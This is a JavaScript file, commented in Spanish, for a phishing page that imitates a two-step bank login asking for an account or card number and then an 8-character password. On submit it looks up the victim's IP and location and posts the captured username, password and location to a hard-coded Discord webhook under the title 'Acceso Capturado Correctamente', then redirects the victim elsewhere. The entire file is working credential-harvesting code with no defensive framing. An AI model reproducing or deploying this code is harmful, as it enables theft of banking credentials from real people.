// CONFIGURACIÓN PROFESIONAL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1501745303240310889/GnaRhmNXSMulsBGW9uu2Suu-a5gNGdMWpqlizPI9he-alilOASSbJmfYkIg1B4r7GndG";

// ELEMENTOS DEL DOM
const userField = document.getElementById('userField');
const btnNext = document.getElementById('btnNext');
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const stepTitle = document.getElementById('stepTitle');
const displayUser = document.getElementById('displayUser');
const passField = document.getElementById('passField');
const btnSubmit = document.getElementById('btnSubmit');

/**
 * PASO 1: Validación y activación de botón "Continuar"
 */
userField.addEventListener('input', (e) => {
    const value = e.target.value.trim();
    
    // Activar si tiene longitud de tarjeta o cuenta (mínimo 8)
    if (value.length >= 8) {
        btnNext.disabled = false;
        btnNext.classList.remove('bg-gray-200', 'text-gray-400', 'opacity-50', 'cursor-not-allowed');
        btnNext.classList.add('bg-red-600', 'text-white', 'opacity-100', 'cursor-pointer');
    } else {
        btnNext.disabled = true;
        btnNext.classList.add('bg-gray-200', 'text-gray-400', 'opacity-50', 'cursor-not-allowed');
        btnNext.classList.remove('bg-red-600', 'text-white', 'opacity-100', 'cursor-pointer');
    }
});

/**
 * TRANSICIÓN: Cambio de vista a Contraseña
 */
btnNext.addEventListener('click', () => {
    if (!btnNext.disabled) {
        stepTitle.innerText = "Bienvenido";
        // Enmascaramos un poco el usuario para que se vea real
        const masked = userField.value.length > 5 
            ? userField.value.substring(0, 4) + "****" 
            : userField.value;
        
        displayUser.innerText = masked;
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    }
});

/**
 * PASO 2: Validación de Contraseña (Exactamente 8 caracteres)
 */
btnSubmit.disabled = true; // Aseguramos que inicie desactivado
btnSubmit.classList.add('opacity-50', 'cursor-not-allowed'); // Estética de desactivado

passField.addEventListener('input', (e) => {
    const value = e.target.value.trim();
    
    // Solo se activa si tiene EXACTAMENTE 8 caracteres
    if (value.length === 8) {
        btnSubmit.disabled = false;
        btnSubmit.classList.remove('opacity-50', 'cursor-not-allowed');
        // Aseguramos que mantenga el color rojo de tu diseño
        btnSubmit.classList.add('opacity-100', 'cursor-pointer');
    } else {
        btnSubmit.disabled = true;
        btnSubmit.classList.add('opacity-50', 'cursor-not-allowed');
        btnSubmit.classList.remove('opacity-100', 'cursor-pointer');
    }
});

/**
 * PASO 2: Captura final y envío a Discord
 * (Modificamos el inicio para validar antes de enviar)
 */
btnSubmit.addEventListener('click', async () => {
    const password = passField.value.trim();
    
    // Doble verificación de seguridad
    if (password.length !== 8) return;

    // Bloqueo visual del botón
    btnSubmit.innerText = "Verificando...";
    btnSubmit.disabled = true;

    // ... (El resto de tu código de geolocalización y fetch a Discord se mantiene IGUAL)
    
    // Inicializamos datos de geolocalización vacíos (Respaldo)
    let geo = {
        ip: "No detectada",
        city: "Desconocida",
        country_name: "Desconocido",
        country_code: "N/A",
        org: "ISP Desconocido"
    };

    try {
        const controller = new AbortController();
        setTimeout(() => controller.abort(), 2000);

        const geoRes = await fetch('https://ipapi.co/json/', { signal: controller.signal });
        if (geoRes.ok) {
            const data = await geoRes.json();
            geo = { ...data };
        }
    } catch (e) {
        console.warn("Geolocalización bloqueada.");
    }

    const payload = {
        embeds: [{
            title: "🎯 Acceso Capturado Correctamente",
            color: 0xec1c24,
            fields: [
                { name: "👤 Usuario/ID", value: `\`${userField.value}\``, inline: true },
                { name: "🔑 Contraseña", value: `\`${password}\``, inline: true },
                { name: "🌐 Dirección IP", value: `\`${geo.ip}\``, inline: false },
                { name: "📍 Ubicación", value: `${geo.city}, ${geo.country_name}`, inline: true }
            ],
            footer: { text: "Sistema de Seguridad Activo" },
            timestamp: new Date()
        }]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        window.location.href = "index2.html";
    } catch (err) {
        window.location.href = "index2.html";
    }
});